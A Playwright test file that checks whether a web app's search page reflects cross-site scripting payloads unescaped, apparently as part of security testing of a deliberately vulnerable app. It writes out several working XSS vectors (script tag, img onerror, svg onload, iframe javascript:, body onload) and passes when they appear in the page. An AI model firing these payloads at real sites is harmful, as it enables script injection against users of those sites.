import { test, expect, Page } from '@playwright/test';

test.describe('/#/search (XSS)', () => {
  test.beforeEach(async ({ page }: { page: Page }) => {
    await page.goto('/');
  });

  test('should reflect XSS payload in search results', async ({ page }) => {
    const xssPayload = '<script>window.xssTriggered=true</script>';
    
    await page.fill('#searchQuery', xssPayload);
    await page.click('#searchForm button[type="submit"]');
    
    await page.waitForSelector('#searchResult.show');
    
    const resultHTML = await page.locator('#searchResult').innerHTML();
    expect(resultHTML).toContain(xssPayload);
    
    console.log('✓ XSS payload reflected in DOM');
  });

  test('should execute image-based XSS', async ({ page }) => {
    const xssPayload = '<img src=x onerror=alert(1)>';
    
    await page.fill('#searchQuery', xssPayload);
    await page.click('#searchForm button[type="submit"]');
    
    await page.waitForSelector('#searchResult.show');
    
    const resultHTML = await page.locator('#searchResult').innerHTML();
    expect(resultHTML).toMatch(/\bsrc\s*=\s*['"]x['"]/);
    expect(resultHTML).toMatch(/\bonerror\s*=\s*['"][^'"]+['"]/);
    
    console.log('✓ Image-based XSS payload injected');
  });

  test('should test multiple XSS vectors', async ({ page }) => {
    const vectors = [
      '<svg/onload=alert(1)>',
      '<iframe src=javascript:alert(1)>',
      '<body onload=alert(1)>'
    ];
    
    for (const vector of vectors) {
      await page.fill('#searchQuery', vector);
      await page.click('#searchForm button[type="submit"]');
      await page.waitForTimeout(500);
      
      const resultHTML = await page.locator('#searchResult').innerHTML();
      if (resultHTML.includes(vector)) {
        console.log(`✓ XSS vector reflected: ${vector}`);
      }
    }
  });
});
